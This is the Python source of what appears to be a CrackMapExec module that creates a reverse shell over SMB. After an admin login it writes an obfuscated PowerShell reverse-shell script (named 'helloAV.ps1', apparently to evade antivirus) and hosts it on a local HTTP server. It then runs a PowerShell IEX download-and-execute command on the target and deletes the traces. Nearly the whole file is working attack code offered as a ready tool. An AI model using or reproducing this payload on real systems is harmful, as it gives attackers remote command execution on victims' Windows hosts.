import os
import time
import subprocess

class CMEModule:
    """
        Create a reverse shell

        Module by Eric Labrador
    """

    name = 'reverse_shell'
    description = "Create a reverse shell."
    supported_protocols = ['smb']
    opsec_safe = True
    multiple_hosts = True

    def __init__(self):
        self.lhost = ''

    def options(self, context, module_options):
        """
        LHOST    Local IP address to connect the reverse shell to
                Required option
        LPORT    Local Port to connect the reverse shell to
                Required option
        HTTP_SERVER    Local Port to start the http server
                Required option
        """

        if 'LHOST' in module_options:
            self.lhost = module_options['LHOST']
        else:
            context.log.error('LHOST is a required option')
        if 'LPORT' in module_options:
            self.lport = module_options['LPORT']
        else:
            context.log.error('LPORT is a required option')
        if 'HTTP_SERVER' in module_options:
            self.http_port = module_options['HTTP_SERVER']
        else:
            context.log.error('HTTP_SERVER is a required option')


    def on_admin_login(self, context, connection):
        context.log.info('Run the following command "nc -lvnp ' + self.lport + '" to receive the reverse shell.')
        revshell1 = "$KLK = New-Object System.Net.Sockets.TCPClient('" + self.lhost + "','" + self.lport + "');"
        revshell2 = "$PLP = $KLK.GetStream();"
        revshell3 = "[byte[]]$VVCCA = 0..((2-shl(3*5))-1)|%{0};"
        revshell5 = "$VVCCA = ([text.encoding]::UTF8).GetBytes('Succesfuly connected .`n`n')"
        revshell6 = "$PLP.Write($VVCCA,0,$VVCCA.Length)"
        revshell7 = "$VVCCA = ([text.encoding]::UTF8).GetBytes((Get-Location).Path + ' > ')"
        revshell8 = "$PLP.Write($VVCCA,0,$VVCCA.Length)"
        revshell9 = "[byte[]]$VVCCA = 0..((2-shl(3*5))-1)|%{0};"
        revshell10 = "while(($A = $PLP.Read($VVCCA, 0, $VVCCA.Length)) -ne 0){;$DD = (New-Object System.Text.UTF8Encoding).GetString($VVCCA,0, $A);"
        revshell11 = "$VZZS = (i`eX $DD 2>&1 | Out-String );"
        revshell12 = "$HHHHHH  = $VZZS + (pwd).Path + '! ';"
        revshell13 = "$L = ([text.encoding]::UTF8).GetBytes($HHHHHH);"
        revshell14 = "$PLP.Write($L,0,$L.Length);"
        revshell15 = "$PLP.Flush()};"
        revshell16 = "$KLK.Close()"

        file = open("helloAV.ps1" ,"w")
        file.write(revshell1 + "\n" + revshell2 + "\n" + revshell3 + "\n" + revshell5 + "\n" + revshell6 + "\n" + revshell7 + "\n" + revshell8 + "\n" + revshell9 + "\n" + revshell10 + "\n" + revshell11 + "\n" + revshell12 + "\n" + revshell13 + "\n" + revshell14 + "\n" + revshell15 + "\n" + revshell16)
        file.close()

        subprocess.Popen("python3 -m http.server " + self.http_port + " &", shell=True,
        stdout=subprocess.PIPE,stdin=subprocess.PIPE, stderr=subprocess.PIPE)

        time.sleep(7)

        reverse_shell_command = "powershell.exe IEX(New-Object Net.WebClient).downloadString('http://" + self.lhost + ":" + self.http_port + "/helloAV.ps1')"
        connection.execute(reverse_shell_command, False)
        context.log.success('Reverse shell payload executed.')

        time.sleep(2)

        os.system("pkill -f http.server")
        os.system("rm -r helloAV.ps1")